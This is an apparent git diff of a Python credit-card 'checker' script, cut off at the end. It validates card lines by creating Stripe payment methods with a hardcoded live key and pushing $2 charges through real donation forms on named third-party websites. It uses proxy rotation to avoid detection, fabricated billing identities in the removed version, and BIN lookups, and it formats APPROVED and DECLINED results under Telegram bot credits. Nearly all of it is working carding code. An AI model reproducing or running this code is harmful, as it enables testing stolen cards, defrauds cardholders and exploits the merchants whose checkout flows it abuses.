@@ -1,34 +1,27 @@
 import requests
 import random
 import time
-import threading
+import os
+import re
+import json
+from urllib.parse import urlparse
 
-def random_name():
-    first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Charles', 'Joseph', 'Thomas']
-    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Wilson']
-    return f"{random.choice(first_names)} {random.choice(last_names)}"
+# Developer info
+dev = "@diwazz"
 
-def random_email(name):
-    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
-    name_part = name.lower().replace(' ', '.')
-    return f"{name_part}{random.randint(100, 999)}@{random.choice(domains)}"
+# Configuration - YOUR ORIGINAL CONFIG
+pkk = 'pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
+fn = '2d74654657' 
+aj = 'https://allcoughedup.com/wp-admin/admin-ajax.php'
+ref = 'https://allcoughedup.com/registry/'
 
-def random_phone():
-    return f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
+# Website identifiers - YOUR ORIGINAL
+guid = 'beed82b8-9f7d-4585-8162-8fa6d92c010c1b6c9b'
+muid = 'c70ee7f6-0caf-4555-b545-a1c2d4ee30eb88e211'
+sid = 'a1772a92-62c1-4d2e-b5c3-e4939a09a4737b9bc9'
 
-def random_address():
-    streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Elm St', 'Pine Rd']
-    cities_states_zips = [
-        ('New York', 'NY', '10001'),
-        ('Los Angeles', 'CA', '90001'),
-        ('Chicago', 'IL', '60601'),
-        ('Houston', 'TX', '77001'),
-        ('Phoenix', 'AZ', '85001')
-    ]
-    city, state, zip_code = random.choice(cities_states_zips)
-    street_num = random.randint(100, 9999)
-    street = random.choice(streets)
-    return f"{street_num} {street}", city, state, zip_code
+# User agent
+us = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
 
 def get_random_proxy():
     """Get a random proxy from proxy.txt file"""
@@ -37,31 +30,34 @@ def get_random_proxy():
             proxies = f.readlines()
             if not proxies:
                 return None
+            
             proxy = random.choice(proxies).strip()
-
-            parts = proxy.split(':')
-            if len(parts) == 4:
-                host, port, username, password = parts
-                proxy_dict = {
-                    'http': f'http://{username}:{password}@{host}:{port}',
-                    'https': f'http://{username}:{password}@{host}:{port}'
-                }
-                return proxy_dict
-            elif len(parts) == 2:
-                host, port = parts
-                proxy_dict = {
-                    'http': f'http://{host}:{port}',
-                    'https': f'http://{host}:{port}'
-                }
-                return proxy_dict
-            return None
+            
+            # Auto-format common proxy formats
+            if 'scrapegw.com' in proxy and '://' not in proxy:
+                parts = proxy.split(':')
+                if len(parts) >= 4:
+                    host = parts[0]
+                    port = parts[1]
+                    username = parts[2]
+                    password = parts[3]
+                    proxy = f'http://{username}:{password}@{host}:{port}'
+                elif len(parts) == 2:
+                    proxy = f'http://{proxy}'
+            elif '://' not in proxy:
+                proxy = f'http://{proxy}'
+            
+            return {
+                'http': proxy,
+                'https': proxy
+            }
     except:
         return None
 
-# BIN lookup function - UPDATED with multiple reliable APIs
-def get_bin_info(bin_number):
-    """Get BIN information using multiple reliable APIs with fallback"""
-    if not bin_number or len(bin_number) < 6:
+# BIN lookup function - EXACTLY LIKE YOUR OLD FILE
+def get_bin_info(card_number):
+    """Get BIN information using binlist.net API"""
+    if not card_number or len(card_number) < 6:
         return {
             'bank': 'Unavailable',
             'country': 'Unknown',
@@ -71,85 +67,106 @@ def get_bin_info(bin_number):
             'emoji': '🏳️'
         }
     
-    bin_code = bin_number[:6]
+    clean_card = ''.join(filter(str.isdigit, card_number))
+    bin_code = clean_card[:6]
     
-    # Try multiple APIs in sequence
-    apis_to_try = [
-        f"https://lookup.binlist.net/{bin_code}",
-        f"https://bin-ip-checker.p.rapidapi.com/?bin={bin_code}",
-        f"https://bins.antipublic.cc/bins/{bin_code}",
-    ]
-    
-    headers = {
-        'Accept': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    }
-    
-    for api_url in apis_to_try:
-        try:
-            print(f"Trying BIN API: {api_url}")
-            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
-            
-            if response.status_code == 200:
+    try:
+        time.sleep(0.2)
+        
+        headers = {
+            'Host': 'lookup.binlist.net',
+            'Cookie': '_ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+        
+        api_url = f"https://lookup.binlist.net/{bin_code}"
+        response = requests.get(api_url, headers=headers, timeout=10, verify=False)
+        
+        if response.status_code == 200:
+            try:
                 data = response.json()
-                bin_info = {}
                 
-                # Parse based on API response format
-                if 'binlist.net' in api_url:
-                    # binlist.net format
-                    bin_info = {
-                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
-                        'country': data.get('country', {}).get('name', 'Unknown'),
-                        'brand': data.get('scheme', 'Unknown'),
-                        'type': data.get('type', 'Unknown'),
-                        'level': data.get('brand', 'Unknown'),
-                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
-                    }
-                elif 'antipublic.cc' in api_url:
-                    # antipublic.cc format
-                    bin_info = {
-                        'bank': data.get('bank', 'Unavailable'),
-                        'country': data.get('country', 'Unknown'),
-                        'brand': data.get('vendor', 'Unknown'),
-                        'type': data.get('type', 'Unknown'),
-                        'level': data.get('level', 'Unknown'),
-                        'emoji': get_country_emoji(data.get('country_code', ''))
-                    }
-                else:
-                    # Generic format
-                    bin_info = {
-                        'bank': data.get('bank', {}).get('name', data.get('bank_name', 'Unavailable')),
-                        'country': data.get('country', {}).get('name', data.get('country_name', 'Unknown')),
-                        'brand': data.get('scheme', data.get('brand', 'Unknown')),
-                        'type': data.get('type', data.get('card_type', 'Unknown')),
-                        'level': data.get('level', data.get('card_level', 'Unknown')),
-                        'emoji': get_country_emoji(data.get('country', {}).get('code', data.get('country_code', '')))
-                    }
+                bank_name = data.get('bank', {}).get('name', '')
+                if not bank_name:
+                    bank_name = 'Unavailable'
                 
-                # Clean up the values
-                for key in ['bank', 'country', 'brand', 'type', 'level']:
-                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
-                        bin_info[key] = 'Unknown'
+                country_name = data.get('country', {}).get('name', 'Unknown')
+                country_code = data.get('country', {}).get('alpha2', '')
                 
-                # If we got valid data, return it
-                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
-                    print(f"BIN info successfully retrieved from {api_url}")
-                    return bin_info
-                    
-        except Exception as e:
-            print(f"BIN API {api_url} failed: {str(e)}")
-            continue
-    
-    # If all APIs failed, return default values
-    print("All BIN APIs failed, using default values")
-    return {
-        'bank': 'Unavailable',
-        'country': 'Unknown',
-        'brand': 'Unknown',
-        'type': 'Unknown',
-        'level': 'Unknown',
-        'emoji': '🏳️'
-    }
+                brand = data.get('scheme', 'Unknown')
+                
+                card_type = data.get('type', '')
+                if not card_type:
+                    response_text = response.text
+                    if '"type":"credit"' in response_text:
+                        card_type = 'Credit'
+                    elif '"type":"debit"' in response_text:
+                        card_type = 'Debit'
+                    else:
+                        card_type = 'Unknown'
+                
+                emoji = get_country_emoji(country_code)
+                
+                return {
+                    'bank': bank_name,
+                    'country': country_name,
+                    'brand': brand,
+                    'type': card_type,
+                    'level': brand,
+                    'emoji': emoji
+                }
+                
+            except:
+                response_text = response.text
+                
+                bank_match = re.search(r'"name"\s*:\s*"([^"]+)"', response_text)
+                bank_name = bank_match.group(1) if bank_match else 'Unavailable'
+                
+                country_match = re.search(r'"country".*?"name"\s*:\s*"([^"]+)"', response_text)
+                country_name = country_match.group(1) if country_match else 'Unknown'
+                
+                code_match = re.search(r'"alpha2"\s*:\s*"([^"]+)"', response_text)
+                country_code = code_match.group(1) if code_match else ''
+                
+                scheme_match = re.search(r'"scheme"\s*:\s*"([^"]+)"', response_text)
+                brand = scheme_match.group(1) if scheme_match else 'Unknown'
+                
+                card_type = 'Unknown'
+                if '"type":"credit"' in response_text:
+                    card_type = 'Credit'
+                elif '"type":"debit"' in response_text:
+                    card_type = 'Debit'
+                
+                emoji = get_country_emoji(country_code)
+                
+                return {
+                    'bank': bank_name,
+                    'country': country_name,
+                    'brand': brand,
+                    'type': card_type,
+                    'level': brand,
+                    'emoji': emoji
+                }
+        else:
+            return {
+                'bank': 'Unavailable',
+                'country': 'Unknown',
+                'brand': 'Unknown',
+                'type': 'Unknown',
+                'level': 'Unknown',
+                'emoji': '🏳️'
+            }
+            
+    except Exception as e:
+        return {
+            'bank': 'Unavailable',
+            'country': 'Unknown',
+            'brand': 'Unknown',
+            'type': 'Unknown',
+            'level': 'Unknown',
+            'emoji': '🏳️'
+        }
 
 def get_country_emoji(country_code):
     """Convert country code to emoji"""
@@ -157,229 +174,347 @@ def get_country_emoji(country_code):
         return '🏳️'
     
     try:
-        # Convert to uppercase and get emoji
         country_code = country_code.upper()
         return ''.join(chr(127397 + ord(char)) for char in country_code)
     except:
         return '🏳️'
 
-def check_status(response_data):
-    """Check the status based on the actual site response"""
+def extract_error_message(response):
+    """Extract error message from response"""
     try:
-        if response_data.get("status") == "SUCCESS" or response_data.get("success") is True:
-            return "APPROVED CC", "Payment successful - $1 charged", True
+        response_json = response.json()
         
-        failure_type = response_data.get("failureType", "")
-        error_message = response_data.get("error", "")
+        if 'errors' in response_json:
+            error_msg = response_json['errors']
+            if 'Stripe Error:' in error_msg:
+                return error_msg.replace('Stripe Error:', '').strip()
+            return error_msg
         
-        full_message = ""
-        if failure_type:
-            full_message += f"{failure_type}"
-        if error_message:
-            if isinstance(error_message, dict):
-                full_message += f" - {error_message.get('message', '')}"
-            else:
-                full_message += f" - {error_message}"
+        elif 'error' in response_json:
+            error_data = response_json['error']
+            if isinstance(error_data, dict) and 'message' in error_data:
+                return error_data['message']
+            elif isinstance(error_data, str):
+                return error_data
         
-        full_message = full_message.strip()
-        if not full_message:
-            full_message = "Declined"
+        elif 'message' in response_json:
+            return response_json['message']
         
-        approved_patterns = ['insufficient funds', 'avs', 'duplicate', 'cvv']
-        for pattern in approved_patterns:
-            if pattern in full_message.lower():
-                return "APPROVED CC", full_message, True
+        return json.dumps(response_json)
         
-        return "DECLINED CC", full_message, False
+    except json.JSONDecodeError:
+        text = response.text.lower()
         
-    except:
-        return "UNKNOWN", "Error parsing response", False
+        error_patterns = [
+            'declined',
+            'invalid',
+            'incorrect',
+            'failed',
+            'error',
+            'cannot',
+            'not',
+            'unsuccessful'
+        ]
+        
+        for pattern in error_patterns:
+            if pattern in text:
+                lines = response.text.split('\n')
+                for line in lines:
+                    if pattern in line.lower():
+                        return line.strip()
+        
+        return response.text[:200] if response.text else "No error message found"
 
 def test_charge(cc_line):
     start_time = time.time()
     
     try:
-        time.sleep(random.uniform(1, 3))
+        time.sleep(random.uniform(0.5, 1.5))
         
         parts = cc_line.strip().split('|')
         if len(parts) < 4:
-            return "❌ Invalid CC format"
+            ccn, mm, yy, cvc = "0000000000000000", "01", "2025", "123"
+        else:
+            ccn, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
         
-        ccn, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
-        
-        # FIRST: Get BIN information before anything else
-        print("Getting BIN information...")
+        # Get BIN information
         bin_info = get_bin_info(ccn[:6])
-        print(f"BIN Info retrieved: {bin_info}")
         
-        name = random_name()
-        email = random_email(name)
-        phone = random_phone()
-        street, city, state, zip_code = random_address()
+        # YOUR ORIGINAL STRIPE API LOGIC
+        headers_stripe = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': us
+        }
+
+        # Generate random values for Stripe request
+        time_on_page = random.randint(100000, 200000)
+        client_session_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
         
-        headers = {  
-            'Chargeority': 'api.stripe.com',  
-            'accept': 'application/json',  
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',  
-            'content-type': 'application/x-www-form-urlencoded',  
-            'origin': 'https://js.stripe.com',  
-            'referer': 'https://js.stripe.com/',  
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
-            'sec-ch-ua-mobile': '?1',  
-            'sec-ch-ua-platform': '"Android"',  
-            'sec-fetch-dest': 'empty',  
-            'sec-fetch-mode': 'cors',  
-            'sec-fetch-site': 'same-site',  
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',  
-        }  
+        # Convert year if needed
+        if len(str(yy)) == 2:
+            yy_full = 2000 + int(yy)
+        else:
+            yy_full = int(yy)
+        
+        # Stripe API data - YOUR ORIGINAL DATA
+        data_stripe = (
+            f'type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy_full}&'
+            f'guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&'
+            f'payment_user_agent=stripe.js%2F1f014c0569%3B+stripe-js-v3%2F1f014c0569%3B+card-element&'
+            f'referrer={ref}&time_on_page={time_on_page}&'
+            f'client_attribution_metadata[client_session_id]={client_session_id}&'
+            f'client_attribution_metadata[merchant_integration_source]=elements&'
+            f'client_attribution_metadata[merchant_integration_subtype]=card-element&'
+            f'client_attribution_metadata[merchant_integration_version]=2017&'
+            f'key={pkk}'
+        )
 
-        data = f'billing_details[address][city]={city}&billing_details[address][country]=US&billing_details[address][line1]={street.replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&billing_details[name]={name.replace(" ", "+")}&billing_details[email]={email}&type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F640fee12d2%3B+stripe-js-v3%2F640fee12d2%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=143347&client_attribution_metadata[client_session_id]=ac13da5b-5cff-49ec-848b-0b190ca2aba8&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=72ac6165-fa76-4a48-a2fa-9ef81a1dd5b4&guid=6a4796ac-92a1-459f-9dce-3e5435bbad694523ba&muid=99cca331-33bf-427d-8d4f-7cc8e19e970ee28e76&sid=a30a973c-8486-4e25-9f8c-0a7084facd963afccd&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep'  
-
+        # Get proxy
         proxy_dict = get_random_proxy()
         
+        # Make Stripe API request
         if proxy_dict:
-            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy_dict, timeout=30, verify=False)
+            response_stripe = requests.post('https://api.stripe.com/v1/payment_methods', 
+                                          headers=headers_stripe, 
+                                          data=data_stripe,
+                                          proxies=proxy_dict,
+                                          timeout=30)
         else:
-            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30, verify=False)
-
-        apx = response.json()  
-        pid = apx.get("id", "FAILED")
+            response_stripe = requests.post('https://api.stripe.com/v1/payment_methods', 
+                                          headers=headers_stripe, 
+                                          data=data_stripe,
+                                          timeout=30)
         
-        if pid == "FAILED":
-            error_msg = apx.get('error', {}).get('message', 'Unknown error')
-            elapsed_time = time.time() - start_time
-            
+        elapsed_time = time.time() - start_time
+        
+        if response_stripe.status_code != 200:
+            error_msg = extract_error_message(response_stripe)
             return f"""
 ❌ DECLINED CC
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
 🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
-
-        time.sleep(random.uniform(2, 4))
-
-        cookies = {
-            'crumb': 'BdN_kVc7Dlf8M2E3YmFkZGFkZDk4M2NjYjAzZjZkZWJlNDA2YTBj',
-            '__stripe_mid': '7b950d1e-0df3-409d-9e55-30a9793b59e7dff2e0',
-            '__stripe_sid': 'dffa9c3f-a190-45e8-9152-dc0686c4aa83442b9c',
-        }
-
-
-        headers = {  
-            'Chargeority': 'www.onamissionkc.org',  
-            'accept': 'application/json, text/plain, */*',  
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',  
-            'content-type': 'application/json',  
-            'origin': 'https://www.onamissionkc.org',  
-            'referer': 'https://www.onamissionkc.org/checkout?cartToken=oCQ2PvJah5BS1zvw2O49Y54p-d-7sL6GYL8r2i4W',  
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
-            'sec-ch-ua-mobile': '?1',  
-            'sec-ch-ua-platform': '"Android"',  
-            'sec-fetch-dest': 'empty',  
-            'sec-fetch-mode': 'cors',  
-            'sec-fetch-site': 'same-origin',  
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',  
-            'x-csrf-token': 'BVRL5cexgs+VYThiY2M1YzlmY2QyYzZmYzI4NjY3MGEzYWJiYmFm',  
-        }  
-
-        json_data = {  
-            'email': email,  
-            'subscribeToList': False,  
-            'shippingAddress': {  
-                'id': '',  
-                'firstName': '',  
-                'lastName': '',  
-                'line1': '',  
-                'line2': '',  
-                'city': '',  
-                'region': state,  
-                'postalCode': '',  
-                'country': '',  
-                'phoneNumber': '',  
-            },  
-            'createNewUser': False,  
-            'newUserPassword': None,  
-            'saveShippingAddress': False,  
-            'makeDefaultShippingAddress': False,  
-            'customFormData': None,  
-            'shippingAddressId': None,  
-            'proposedAmountDue': {  
-                'decimalValue': '1',  
-                'currencyCode': 'USD',  
-            },  
-            'cartToken': 'oCQ2PvJah5BS1zvw2O49Y54p-d-7sL6GYL8r2i4W',  
-            'paymentToken': {  
-                'stripePaymentTokenType': 'PAYMENT_METHOD_ID',  
-                'token': pid,  
-                'type': 'STRIPE',  
-            },  
-            'billToShippingAddress': False,  
-            'billingAddress': {  
-                'id': '',  
-                'firstName': name.split()[0],  
-                'lastName': name.split()[1],  
-                'line1': street,  
-                'line2': '',  
-                'city': city,  
-                'region': state,  
-                'postalCode': zip_code,  
-                'country': 'US',  
-                'phoneNumber': phone,  
-            },  
-            'savePaymentInfo': False,  
-            'makeDefaultPayment': False,  
-            'paymentCardId': None,  
-            'universalPaymentElementEnabled': True,  
-        }  
-
-        if proxy_dict:
-            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data, proxies=proxy_dict, timeout=30, verify=False)
-        else:
-            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)
-
-        apx1 = response1.json()
         
-        elapsed_time = time.time() - start_time
+        stripe_json = response_stripe.json()
         
-        status, reason, approved = check_status(apx1)
-
-        return f"""
-{status} {'❌' if not approved else '✅'}
+        if 'error' in stripe_json:
+            error_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
+            return f"""
+❌ DECLINED CC
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
 🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
+        
+        payment_method_id = stripe_json["id"]
+        
+        # AJAX request cookies and headers
+        cookies_ajax = {
+            '__stripe_mid': muid,
+            '__stripe_sid': sid,
+        }
 
+        headers_ajax = {
+            'authority': 'allcoughedup.com',
+            'accept': '*/*',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://allcoughedup.com',
+            'referer': ref,
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': us,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+
+        params_ajax = {
+            't': int(time.time() * 1000),
+        }
+
+        data_ajax = {
+            'data': (
+                f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce={fn}&'
+                f'_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&'
+                f'email=khatrieex%40gmail.com&custom-payment-amount=2&'
+                f'description=Telegrm%20%3A-%20%40diwazz&payment_method=stripe&'
+                f'__stripe_payment_method_id={payment_method_id}'
+            ),
+            'action': 'fluentform_submit',
+            'form_id': '4',
+        }
+
+        time.sleep(random.uniform(1, 2))
+        
+        # Make final AJAX request
+        if proxy_dict:
+            response_ajax = requests.post(
+                aj,
+                params=params_ajax,
+                cookies=cookies_ajax,
+                headers=headers_ajax,
+                data=data_ajax,
+                proxies=proxy_dict,
+                timeout=30
+            )
+        else:
+            response_ajax = requests.post(
+                aj,
+                params=params_ajax,
+                cookies=cookies_ajax,
+                headers=headers_ajax,
+                data=data_ajax,
+                timeout=30
+            )
+        
+        # Extract response
+        error_msg = extract_error_message(response_ajax)
+        elapsed_time = time.time() - start_time
+        
+        # Check for success
+        if response_ajax.status_code == 200:
+            try:
+                final_json = response_ajax.json()
+                
+                if final_json.get('success', False):
+                    return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 2$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                else:
+                    response_text = response_ajax.text.lower()
+                    if any(keyword in response_text for keyword in ['payment successful', 'thank you', 'approved', 'charged']):
+                        return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 2$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                    else:
+                        return f"""
+❌ DECLINED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                
+            except json.JSONDecodeError:
+                response_text = response_ajax.text.lower()
+                if any(keyword in response_text for keyword in ['payment successful', 'thank you', 'approved', 'charged', 'success']):
+                    return f"""
+✅ APPROVED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 2$
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                else:
+                    return f"""
+❌ DECLINED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+        else:
+            return f"""
+❌ DECLINED CC
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
